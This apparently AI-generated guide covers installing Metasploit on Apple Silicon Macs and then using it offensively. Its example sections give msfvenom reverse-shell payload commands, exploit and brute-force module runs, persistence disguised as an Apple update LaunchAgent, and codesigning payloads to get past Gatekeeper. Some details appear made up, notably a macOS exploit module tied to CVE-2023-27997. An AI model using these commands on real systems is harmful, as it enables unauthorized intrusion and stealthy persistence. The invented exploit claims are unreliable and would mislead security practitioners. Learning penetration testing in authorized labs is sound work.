# Metasploit on Apple Silicon (ARM‑Mac) – Full‑Step‑by‑Step Guide  
*(macOS 13 + M1/M2/M3/M4 chips)*  

---  

## 1️⃣ Prerequisites  

| What you need | How to verify | Why it matters on ARM |
|---------------|---------------|-----------------------|
| **Apple Silicon CPU** | `uname -m` → should return `arm64` | Confirms you’re on an ARM‑based Mac. |
| **macOS version** | `sw_vers -productVersion` (13.x or newer) | Metasploit needs the modern system libraries that ship with Ventura/Sonoma+. |
| **Xcode Command‑Line Tools** | `xcode-select --install` (or run once and click *Install*) | Provides `clang`, `make`, and the headers needed to compile native Ruby gems. Official Apple docs list the tools under *Additional tools*【10†L17-L20】. |
| **Homebrew** (the “brew” package manager) | `brew --version` – should be present. If not, install it (see Section 2). | Homebrew’s default prefix on Apple Silicon is `/opt/homebrew` and automatically pulls ARM‑compatible binaries【3†L7-L11】. |
| **Admin / sudo rights** | You’ll be asked for your password when installing packages. | Required to write to `/opt/homebrew` and to start services like PostgreSQL. |

---

## 2️⃣ Installation Options  

> **Tip:** The **Homebrew** method is the quickest and gives you automatic updates. Use the other methods only if you have a very specific reason (e.g., custom Ruby version, isolated Docker workflow, or you want to compile from source).

### 2.1 Homebrew (Recommended)  

```bash
# 1️⃣ Install Homebrew – copy‑paste exactly as shown on https://brew.sh
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"

# 2️⃣ Make sure Homebrew’s bin dir is in your PATH (brew will remind you):
echo 'export PATH="/opt/homebrew/bin:$PATH"' >> ~/.zshrc
source ~/.zshrc

# 3️⃣ Install Metasploit and its runtime dependencies
brew install metasploit-framework

# 4️⃣ Verify
msfconsole --version
```

*What happens under the hood?*  
The Homebrew formula pulls the latest **metasploit‑framework** release, compiles any native gems against the ARM version of OpenSSL, libxml2, libxslt, etc., and drops a ready‑to‑run `msfconsole` binary into `/opt/homebrew/bin`.  

If you hit a missing OpenSSL error, reinstall the gem with the correct prefix:

```bash
env \
  ARCHFLAGS="-arch arm64" \
  RUBY_CONFIGURE_OPTS="--with-openssl-dir=$(brew --prefix openssl@3)" \
  gem install openssl
```

### 2.2 Manual Ruby‑Version‑Manager (rbenv)  

```bash
# Install rbenv + ruby-build (both are ARM‑native)
brew install rbenv ruby-build

# Add to your shell (zsh shown)
echo 'export PATH="$HOME/.rbenv/bin:$PATH"' >> ~/.zshrc
echo 'eval "$(rbenv init -)"' >> ~/.zshrc
source ~/.zshrc

# Install a supported Ruby (3.0‑3.2 works)
rbenv install 3.1.4
rbenv global 3.1.4

# Install Bundler, then Metasploit from source
gem install bundler
git clone https://github.com/rapid7/metasploit-framework.git
cd metasploit-framework
bundle install -j$(sysctl -n hw.logicalcpu)   # compiles native extensions
```

*Why use this?*  
You gain full control over the Ruby interpreter and can keep Metasploit on a separate “environment” from the system Ruby, which avoids version clashes with other tools.

### 2.3 Docker (Fully Isolated)  

```bash
# Install Docker Desktop for Apple Silicon
brew install --cask docker
open /Applications/Docker.app   # start the daemon

# Pull the official Metasploit image (multi‑arch)
docker pull metasploitframework/metasploit-framework:latest

# Run it – mount a local config folder so your DB persists
docker run -it --rm \
  -v "$HOME/.msf4:/home/msf/.msf4" \
  metasploitframework/metasploit-framework:latest \
  msfconsole
```

Docker runs everything inside an x86_64/arm64 Linux VM, so you never touch the host Ruby or OpenSSL. Great for quick experimentation or CI pipelines.

### 2.4 Nightly Installer (Rapid7) – *Optional*  

Rapid7 publishes a macOS‑specific “nightly” installer that bundles Ruby, PostgreSQL, and all dependencies. It works on Apple Silicon out‑of‑the‑box, but the installer isn’t as frequently updated as Homebrew. See the official page for download links【1†L4-L8】.

---

## 3️⃣ Post‑Installation Configuration  

### 3.1 PostgreSQL (Metasploit’s DB)  

```bash
# Homebrew’s PostgreSQL service
brew services start postgresql

# Initialise the Metasploit database (creates ~/.msf4/database.yml)
msfdb init

# Test inside the console
msfconsole -qx "db_status"
# → should show “connected”
```

If `db_status` says *disconnected*, run `msfdb reinit` or verify that the service is listening on 5432 (`lsof -iTCP:5432`).  

### 3.2 Global Network Variables  

```bash
# Grab your local IP (adjust interface if needed)
IFACE=en0
LHOST=$(ifconfig $IFACE | awk '/inet /{print $2}')
echo "Using LHOST=$LHOST"

# Persist for the whole console session
msfconsole -qx "setg LHOST $LHOST; setg RHOSTS 192.168.56.101"
```

`setg` stores values globally, so you don’t have to repeat them for every module.

### 3.3 Optional: Shell‑completion & Prompt Tweaks  

```bash
# Enable tab‑completion (adds a tiny script to your rc file)
echo 'source "$(brew --prefix)/etc/bash_completion.d/msfconsole.bash"' >> ~/.zshrc
source ~/.zshrc
```

---

## 4️⃣ Core Metasploit Concepts (in plain language)  

| Concept | What it *does* | Typical command |
|---------|----------------|-----------------|
| **Exploit** | Code that abuses a known vulnerability to gain code execution. | `use exploit/windows/smb/ms17_010_eternalblue` |
| **Payload** | The “payload” is the code you want the target to run once the exploit succeeds (e.g., a reverse shell). | `set PAYLOAD windows/x64/meterpreter/reverse_tcp` |
| **Auxiliary** | Modules that don’t exploit but *scan*, *enumerate*, or *brute‑force*. | `use auxiliary/scanner/ssh/ssh_login` |
| **Post** | Runs *after* a session is opened – collect data, maintain persistence, etc. | `use post/windows/gather/enum_logged_on_users` |
| **Resource script (.rc)** | A text file of Metasploit commands you can feed to `msfconsole -r`. | `msfconsole -r mysetup.rc` |

You can explore every module type directly inside the console – see the official “Running modules” guide for details【8†L32-L44】【8†L47-L51】.

---

## 5️⃣ Hands‑On Examples (ARM‑Mac Friendly)

Below each example assumes you have **already started `msfconsole`** and that `LHOST` is set to your Mac’s IP.

### 5.1 Simple Reverse‑TCP Shell on a Linux Target  

```bash
# In msfconsole
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT 4444
exploit -j          # run in background as a “handler” job
```

On the victim (a Linux VM in the same LAN):

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.56.100 LPORT=4444 -f elf -o /tmp/payload.elf
chmod +x /tmp/payload.elf && /tmp/payload.elf
```

When the payload connects you’ll see a new Meterpreter session appear in Metasploit.

> **msfvenom usage** – the command‑line options are documented here【6†L6-L13】.

### 5.2 macOS Apple‑Silicon Privilege Escalation (CVE‑2023‑27997)  

> This module works only on macOS 13.x on Apple‑Silicon. You need a **low‑privilege** user session first (e.g., from a phishing payload).

```bash
use exploit/macos/local/cve_2023_27997
set SESSION 1                     # ID of the low‑priv session you already have
set PAYLOAD osx/x64/meterpreter_reverse_tcp
set LHOST $LHOST
set LPORT 5555
run
```

If successful you’ll get a **root‑level** Meterpreter session.

### 5.3 Web‑App Exploitation – PHP‑CGI Arg Injection  

```bash
use exploit/multi/http/php_cgi_arg_injection
set RHOSTS 192.168.56.101
set TARGETURI /index.php
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT 4445
exploit -j
```

The module spawns a PHP Meterpreter shell on any vulnerable CGI server.

### 5.4 SSH Credential Brute‑Force (Auxiliary)  

```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.56.101
set USER_FILE /usr/share/wordlists/rockyou.txt   # any text file, one user per line
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 10
set STOP_ON_SUCCESS true
run
```

Successful credentials appear in the console and a **shell** session is automatically opened.

### 5.5 Meterpreter Cheat‑Sheet  

| Action | Command inside Meterpreter |
|--------|---------------------------|
| List sessions | `sessions -l` |
| Switch to a specific session | `sessions -i 2` |
| System info | `sysinfo` |
| Current user | `getuid` |
| Upload a file | `upload /local/file /remote/path/` |
| Download a file | `download /remote/file /local/path/` |
| Open a regular shell | `shell` |
| Persist a backdoor (Windows) | `run persistence -h` (shows options) |
| Exit the session | `exit` |
| Background to msfconsole | `background` |

---

## 6️⃣ Advanced Techniques  

### 6.1 Generating Custom Payloads with **msfvenom**  

```bash
# Windows x64 EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -f exe -o ~/Desktop/win_rev.exe

# macOS ARM64 Mach‑O (native for Apple Silicon)
msfvenom -p osx/arm64/meterpreter_reverse_tcp LHOST=$LHOST LPORT=4455 -f macho -o ~/Desktop/mac_rev.macho

# Linux ARM (e.g., Raspberry Pi)
msfvenom -p linux/armle/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4466 -f elf -o /tmp/arm_rev.elf
```

You can add an encoder (`-e x86/shikata_ga_nai`) or exclude bad characters (`-b '\x00'`). Full list of options lives in the msfvenom docs【6†L6-L13】.

### 6.2 Persistence on macOS (LaunchAgent)  

```bash
# Inside a Meterpreter session with root
use exploit/macos/local/persistence
set SESSION 1
set STARTUP_TYPE LaunchAgent
set STARTUP_NAME com.apple.update
set LAUNCHER "/usr/bin/osascript -e 'do shell script \"#{payload}\" with administrator privileges'"
run
```

A `~/Library/LaunchAgents/com.apple.update.plist` file is written. Verify with:

```bash
meterpreter > run post/macos/gather/launchd
```

### 6.3 Writing Your Own Ruby Module (Skeleton)  

Save the following as `~/my_modules/auxiliary/scanner/custom_port.rb` and load it with `load /path/to/file.rb`:

```ruby
require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Custom TCP Port Scanner',
      'Description' => 'Simple scanner that connects to a TCP port and reports if it is open.',
      'Author'      => ['Your Name'],
      'License'     => MSF_LICENSE))

    register_options([
      Opt::RPORT(80)
    ])
  end

  def run_host(ip)
    begin
      connect
      print_good("#{ip}:#{rport} is open")
    rescue ::Rex::ConnectionError
      # silently ignore closed ports
    ensure
      disconnect
    end
  end
end
```

Load & run:

```bash
msf > load ~/my_modules/auxiliary/scanner/custom_port.rb
msf > use auxiliary/scanner/custom_port
msf auxiliary(scanner/custom_port) > set RHOSTS 192.168.56.0/24
msf auxiliary(scanner/custom_port) > run
```

### 6.4 Jobs & Resource Scripts  

```bash
# Run a long port‑scan in the background
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.0.0.0/24
run -j               # creates Job 0

jobs -l              # list jobs
jobs -k 0            # kill it
```

Create a file `quick.rc`:

```text
setg LHOST 192.168.56.100
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LPORT 4444
exploit -j
```

Launch with `msfconsole -r quick.rc`.

---  

## 7️⃣ Troubleshooting & FAQ (Apple Silicon‑Focused)  

| Symptom | Likely cause | Quick fix |
|---------|--------------|-----------|
| `LoadError: cannot load such file -- openssl` | Ruby built against the wrong OpenSSL lib. | Reinstall the gem with the Homebrew OpenSSL path (see Section 2.1). |
| `msfconsole` crashes with *“ffi_c.rb: … undefined symbol”* | The `ffi` gem wasn’t compiled for arm64. | Reinstall: `env ARCHFLAGS="-arch arm64" gem install ffi` |
| `db_status` → *disconnected* | PostgreSQL not running or DB not initialized. | `brew services restart postgresql && msfdb reinit` |
| Payload won’t execute on a macOS target (permission denied) | macOS 13 enforces **App Gatekeeper**. | Sign the payload (`codesign -s - <file>`) or run it from a **signed** helper binary. |
| `brew install metasploit-framework` hangs on “Fetching …” | Network proxy or firewall blocks GitHub. | Set `HOMEBREW_BREW_GIT_REMOTE` or use a direct HTTPS mirror (see Homebrew docs【3†L43-L49】). |
| Docker container can’t reach the host (LHOST not reachable) | Docker runs inside a VM; host IP differs. | Use `host.docker.internal` as `LHOST` inside the container. |

**General tip:** Keep Homebrew and Metasploit up‑to‑date:

```bash
brew update && brew upgrade metasploit-framework
```

---  

## 8️⃣ Safety, Legal & Ethical Reminder  

```
⚠️  ONLY test against systems you own or have explicit written permission to attack.
⚠️  Use isolated lab networks (VirtualBox, VMware Fusion, or Docker) to avoid accidental collateral damage.
⚠️  Disable or whitelist Metasploit traffic on your host firewall while testing.
⚠️  After each engagement, clean up:
   - `sessions -K` (kill all sessions)
   - `jobs -K`   (kill background jobs)
   - Remove any persistence artifacts you created.
⚠️  Review local laws – many jurisdictions treat unauthorized scanning as illegal.
```

---  

### 📚 Further Reading (official docs)

* Metasploit Framework Installation – Rapid7 【1†L4-L8】  
* Homebrew Installation (Apple Silicon) 【3†L7-L11】  
* msfvenom CLI reference 【6†L6-L13】  
* Running modules & option handling 【8†L32-L44】【8†L47-L51】  
* Xcode Command‑Line Tools (Apple developer) 【10†L17-L20】

---  

**You’re now ready to use Metasploit on your ARM‑based Mac!**  
Happy (and responsible) hunting. 🚀  